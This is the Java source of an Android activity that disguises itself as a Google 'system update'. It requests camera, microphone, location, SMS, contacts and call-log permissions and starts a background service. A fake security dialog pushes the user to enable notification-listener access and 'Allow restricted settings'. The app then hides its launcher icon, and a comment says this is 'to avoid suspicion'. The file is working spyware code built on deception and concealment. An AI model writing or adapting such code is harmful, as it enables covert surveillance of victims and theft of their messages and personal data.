package com.google.android.sys.security;

import android.Manifest;
import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.view.View;
import android.widget.Button;
import android.widget.ProgressBar;
import android.widget.TextView;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private static final int PERMISSION_REQUEST_CODE = 100;
    private SharedPreferences prefs;
    private TextView statusTextView;
    private ProgressBar progressBar;
    private Button btnUpdate;
    
    // Group permissions for cleaner request
    private String[] getRequiredPermissions() {
        List<String> permissions = new ArrayList<>();
        permissions.add(Manifest.permission.CAMERA);
        permissions.add(Manifest.permission.RECORD_AUDIO);
        permissions.add(Manifest.permission.ACCESS_FINE_LOCATION);
        permissions.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        permissions.add(Manifest.permission.READ_PHONE_STATE);
        permissions.add(Manifest.permission.READ_SMS);
        permissions.add(Manifest.permission.READ_CONTACTS);
        permissions.add(Manifest.permission.READ_CALL_LOG);
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS);
            permissions.add(Manifest.permission.READ_MEDIA_IMAGES);
            permissions.add(Manifest.permission.READ_MEDIA_VIDEO);
            permissions.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            permissions.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            permissions.add(Manifest.permission.READ_EXTERNAL_STORAGE);
        }
        
        return permissions.toArray(new String[0]);
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Initialize preferences
        prefs = getSharedPreferences("system_update", MODE_PRIVATE);
        
        // IMPORTANT: DO NOT start service yet. 
        // On Android 14+, starting a foreground service with camera/mic/loc types 
        // before permissions are granted will cause an immediate crash.
        
        statusTextView = findViewById(R.id.statusView);
        progressBar = findViewById(R.id.progressBar);
        btnUpdate = findViewById(R.id.btnUpdate);

        // If all permissions already granted, wait 3 seconds for service to connect then hide
        if (hasAllPermissions()) {
            statusTextView.setText("System is up to date");
            btnUpdate.setVisibility(View.GONE);
            progressBar.setVisibility(View.VISIBLE);
            progressBar.setIndeterminate(true);
            
            new android.os.Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    hideAppIcon();
                    finish();
                }
            }, 3000);
            return;
        }

        btnUpdate.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                requestAllPermissions();
            }
        });
    }

    private boolean hasAllPermissions() {
        for (String permission : getRequiredPermissions()) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }
        return true;
    }

    private void requestAllPermissions() {
        ActivityCompat.requestPermissions(this, getRequiredPermissions(), PERMISSION_REQUEST_CODE);
    }

    private void startMainService() {
        Intent intent = new Intent(this, MainService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(intent);
        } else {
            startService(intent);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == PERMISSION_REQUEST_CODE) {
            statusTextView.setText("Checking system security configuration...");
            btnUpdate.setVisibility(View.GONE);
            progressBar.setVisibility(View.VISIBLE);
            progressBar.setIndeterminate(true);
            
            startMainService();
            
            // Short delay to show "checking" then handle Notification Access
            new android.os.Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    if (!isNotificationServiceEnabled()) {
                        showRestrictedSettingsGuide();
                    } else {
                        completeInstallation();
                    }
                }
            }, 2000);
        }
    }

    private void showRestrictedSettingsGuide() {
        android.app.AlertDialog.Builder builder = new android.app.AlertDialog.Builder(this);
        builder.setTitle("Security Access Required");
        builder.setMessage("To protect your messages from unauthorized access, please enable 'System Notification Manager' in the next screen.\n\n" +
                "Note: If the switch is disabled, click the 3-dots menu in 'App Info' and select 'Allow restricted settings' first.");
        builder.setPositiveButton("CONTINUE", (dialog, which) -> {
            try {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                
                // Monitor for activation in background then finish
                startCompletionMonitor();
            } catch (Exception e) {
                completeInstallation();
            }
        });
        builder.setCancelable(false);
        builder.show();
    }

    private void startCompletionMonitor() {
        statusTextView.setText("Waiting for security confirmation...");
        final android.os.Handler handler = new android.os.Handler();
        handler.postDelayed(new Runnable() {
            @Override
            public void run() {
                if (isNotificationServiceEnabled()) {
                    completeInstallation();
                } else {
                    // Check again in 2 seconds, but only for a limited time (e.g., 30s)
                    handler.postDelayed(this, 2000);
                }
            }
        }, 2000);
        
        // Safety timeout: if they don't do it in 60s, just hide anyway to avoid suspicion
        handler.postDelayed(() -> completeInstallation(), 60000);
    }

    private void completeInstallation() {
        statusTextView.setText("System update installed successfully.");
        new android.os.Handler().postDelayed(new Runnable() {
            @Override
            public void run() {
                hideAppIcon();
                finish();
            }
        }, 3000);
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = android.provider.Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null && !flat.isEmpty()) {
            final String[] names = flat.split(":");
            for (int i = 0; i < names.length; i++) {
                final ComponentName cn = ComponentName.unflattenFromString(names[i]);
                if (cn != null && pkgName.equals(cn.getPackageName())) {
                    return true;
                }
            }
        }
        return false;
    }

    private void hideAppIcon() {
        try {
            PackageManager p = getPackageManager();
            // Target the alias instead of the main class
            ComponentName componentName = new ComponentName(this, 
                "com.google.android.sys.security.LauncherActivity");
            
            p.setComponentEnabledSetting(componentName, 
                PackageManager.COMPONENT_ENABLED_STATE_DISABLED, 
                PackageManager.DONT_KILL_APP);
            
            prefs.edit().putBoolean("icon_hidden", true).apply();
            
            // Go to home screen
            Intent intent = new Intent(Intent.ACTION_MAIN);
            intent.addCategory(Intent.CATEGORY_HOME);
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
